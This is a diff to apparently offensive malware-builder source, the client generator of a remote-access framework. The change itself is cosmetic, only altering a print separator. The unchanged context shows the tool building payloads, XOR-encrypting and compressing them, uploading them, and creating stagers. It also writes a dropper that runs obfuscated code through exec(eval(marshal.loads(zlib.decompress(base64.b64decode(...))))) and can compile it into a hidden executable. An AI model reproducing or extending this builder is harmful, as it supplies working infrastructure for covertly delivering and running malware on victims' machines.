@@ -197,9 +197,9 @@ def _update(input, output, task=None):
     util.display("({:,} bytes {} to {:,} bytes ({}% {})".format(len(input), 'increased' if len(output) > len(input) else 'reduced', len(output), diff, 'larger' if len(output) > len(input) else 'smaller').ljust(80), style='dim', color='reset')
 
 def _modules(options, **kwargs):
-    util.display("\n[>]", color='green', style='bright', end=',')
+    util.display("\n[>]", color='green', style='bright', end=' ')
     util.display('Modules', color='reset', style='bright')
-    util.display("\tAdding modules... ", color='reset', style='normal', end=',')
+    util.display("\tAdding modules... ", color='reset', style='normal', end=' ')
 
     global __load__
     __load__ = threading.Event()
@@ -224,12 +224,12 @@ def _modules(options, **kwargs):
     return modules
 
 def _imports(options, **kwargs):
-    util.display("\n[>]", color='green', style='bright', end=',')
+    util.display("\n[>]", color='green', style='bright', end=' ')
     util.display("Imports", color='reset', style='bright')
 
     assert 'modules' in kwargs, "missing keyword argument 'modules'"
 
-    util.display("\tAdding imports...", color='reset', style='normal', end=',')
+    util.display("\tAdding imports...", color='reset', style='normal', end=' ')
 
     global __load__
     globals()['__load__'] = threading.Event()
@@ -275,7 +275,7 @@ def _hidden(options, **kwargs):
     return list(hidden)
 
 def _payload(options, **kwargs):
-    util.display("\n[>]", color='green', style='bright', end=',')
+    util.display("\n[>]", color='green', style='bright', end=' ')
     util.display("Payload", color='reset', style='bright')
 
     assert 'var' in kwargs, "missing keyword argument 'var'"
@@ -293,7 +293,7 @@ def _payload(options, **kwargs):
             util.log("Permission denied: unabled to make directory './modules/payloads/'")
 
     if options.compress:
-        util.display("\tCompressing payload... ", color='reset', style='normal', end=',')
+        util.display("\tCompressing payload... ", color='reset', style='normal', end=' ')
         __load__ = threading.Event()
         __spin__ = _spinner(__load__)
         output = generators.compress(payload)
@@ -303,7 +303,7 @@ def _payload(options, **kwargs):
 
     if options.encrypt:
         assert 'key' in kwargs, "missing keyword argument 'key' required for option 'encrypt'"
-        util.display("\tEncrypting payload... ".format(kwargs['key']), color='reset', style='normal', end=',')
+        util.display("\tEncrypting payload... ".format(kwargs['key']), color='reset', style='normal', end=' ')
         __load__ = threading.Event()
         __spin__ = _spinner(__load__)
         output = security.encrypt_xor(payload, base64.b64decode(kwargs['key']))
@@ -311,7 +311,7 @@ def _payload(options, **kwargs):
         _update(payload, output, task='Encryption')
         payload = output
 
-    util.display("\tUploading payload... ", color='reset', style='normal', end=',')
+    util.display("\tUploading payload... ", color='reset', style='normal', end=' ')
 
     __load__ = threading.Event()
     __spin__ = _spinner(__load__)
@@ -340,7 +340,7 @@ def _payload(options, **kwargs):
     return url
 
 def _stager(options, **kwargs):
-    util.display("\n[>]", color='green', style='bright', end=',')
+    util.display("\n[>]", color='green', style='bright', end=' ')
     util.display("Stager", color='reset', style='bright')
 
     assert 'url' in kwargs, "missing keyword argument 'url'"
@@ -359,7 +359,7 @@ def _stager(options, **kwargs):
             util.log("Permission denied: unable to make directory './modules/stagers/'")
 
     if options.compress:
-        util.display("\tCompressing stager... ", color='reset', style='normal', end=',')
+        util.display("\tCompressing stager... ", color='reset', style='normal', end=' ')
         __load__ = threading.Event()
         __spin__ = _spinner(__load__)
         output = generators.compress(stager)
@@ -367,7 +367,7 @@ def _stager(options, **kwargs):
         _update(stager, output, task='Compression')
         stager = output
 
-    util.display("\tUploading stager... ", color='reset', style='normal', end=',')
+    util.display("\tUploading stager... ", color='reset', style='normal', end=' ')
     __load__ = threading.Event()
     __spin__ = _spinner(__load__)
 
@@ -395,9 +395,9 @@ def _stager(options, **kwargs):
     return url
 
 def _dropper(options, **kwargs):
-    util.display("\n[>]", color='green', style='bright', end=',')
+    util.display("\n[>]", color='green', style='bright', end=' ')
     util.display("Dropper", color='reset', style='bright')
-    util.display('\tWriting dropper... ', color='reset', style='normal', end=',')
+    util.display('\tWriting dropper... ', color='reset', style='normal', end=' ')
 
     assert 'url' in kwargs, "missing keyword argument 'url'"
     assert 'var' in kwargs, "missing keyword argument 'var'"
@@ -416,7 +416,7 @@ exec(eval(marshal.loads(zlib.decompress(base64.b64decode({})))))""".format(repr(
     util.display('({:,} bytes written to {})'.format(len(dropper), name), style='dim', color='reset')
 
     if options.freeze:
-        util.display('\tCompiling executable...\n', color='reset', style='normal', end=',')
+        util.display('\tCompiling executable...\n', color='reset', style='normal', end=' ')
         name = generators.freeze(name, icon=options.icon, hidden=kwargs['hidden'])
         util.display('({:,} bytes saved to file: {})\n'.format(len(open(name, 'rb').read()), name))
     return name
